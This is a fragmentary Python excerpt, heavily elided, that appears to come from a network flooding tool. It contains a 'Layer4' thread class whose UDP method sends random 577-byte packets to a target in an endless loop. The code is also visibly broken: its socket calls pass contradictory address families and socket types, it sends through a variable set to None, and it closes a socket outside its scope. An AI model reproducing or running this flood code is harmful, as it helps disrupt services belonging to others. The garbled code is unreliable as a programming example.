...
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("FantasticVipper")
...
with socket(AF_INET6, AF_INET, SOCK_STREAM, SOCK_DGRAM) as s:
...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        random = None
        with suppress(Exception), socket(AF_INET6, AF_INET, SOCK_DGRAM, SOCK_STREAM) as s:
            while Tools.sendto(random, randbytes(577), self._target):
                continue
        Tools.safe_close(s)
